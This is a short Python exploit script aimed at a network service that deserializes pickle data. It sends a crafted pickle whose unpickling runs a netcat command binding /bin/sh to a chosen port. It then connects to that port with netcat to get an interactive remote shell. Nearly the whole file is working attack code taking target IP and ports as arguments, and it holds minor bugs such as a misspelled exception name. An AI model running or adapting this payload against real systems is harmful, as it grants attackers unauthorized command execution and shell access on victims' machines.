#!/usr/bin/env python
from __future__ import print_function
import os
import socket
import sys
import time


def payload(shell_port):
    pickled_shell = "cos\nsystem\n(S'nc.traditional -l -p {0:d} -e /bin/sh'".format(shell_port)
    return bytes(pickled_shell)


def launch_netcat(rhost, shell_port):
    """ Apparently, netcat has it's own way of answering to network data. """
    os.system("nc {0:s} {1:d}".format(rhost, shell_port))


def conx(rhost, rport, shell_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    err = 0
    
    try:
        print("Connecting to {0:s}:{1:d}".format(rhost, rport))
        sock.connect((rhost, rport))
        
        print("Sending pickle...")
        sock.send(payload(shell_port))
        
        # Let's wait for the sent data.
        time.sleep(1)
        
        print("Launching netcat on port {0:d}".format(shell_port))
        launch_netcat(rhost, shell_port)
    
    except socket.error as sock_err:
        print("Error: {0:s}".format(sock.strerror), file=sys.stderr)
        err = sock_err.errno
    
    except socket.gaierror as g_error:
        print("Error: {0:s}".format(g_error.strerror), file=sys.stderr)
        err = g_error.errno
     
    except Exeption as gen_err:
        print(gen_err, file=sys.stderr)
    
    finally:
        sock.close()
        sys.exit(err)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: {0} <ip> <port> <nc shell port>".format(sys.argv[0]))
        sys.exit(0)
    
    conx(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
